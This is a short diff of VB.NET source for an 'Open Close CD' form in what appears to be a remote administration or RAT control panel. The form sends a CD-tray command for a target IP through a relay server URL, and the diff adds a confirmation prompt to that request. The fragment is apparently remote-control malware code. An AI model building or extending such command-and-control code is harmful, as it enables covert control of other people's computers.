@@ -6,15 +6,15 @@ Public Class OpenCloseCD
         Me.Text = "Open Close CD @" & targetIp
     End Sub
     Private Sub sendButton_Click(sender As Object, e As EventArgs) Handles sendButton.Click
-        Dim client As New WebClient
-        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=cdopen&actioncontent=" & repeatAmountNUD.Text)
+        If Utils.DirectPanelCommand(targetIp, New WebClient(), "Are you sure you want to proceed ?", "cdopen", {repeatAmountNUD.Text}) Then
 
-        Dim separateThreadMsg As New _
-            Threading.Thread(Sub() MsgBox("Request successfully sent to " & targetIp & ".", MsgBoxStyle.Information))
-        separateThreadMsg.Start()
+            Dim separateThreadMsg As New _
+                Threading.Thread(Sub() MsgBox("Request successfully sent to " & targetIp & ".", MsgBoxStyle.Information))
+            separateThreadMsg.Start()
 
-        sendButton.Text = "Sending..." : sendButton.Enabled = False
-        Utils.ResponsiveSleep(repeatAmountNUD.Value * 6000)
-        sendButton.Enabled = True : sendButton.Text = "Send"
+            sendButton.Text = "Sending..." : sendButton.Enabled = False
+            Utils.ResponsiveSleep(repeatAmountNUD.Value * 6000)
+            sendButton.Enabled = True : sendButton.Text = "Send"
+        End If
     End Sub
 End Class
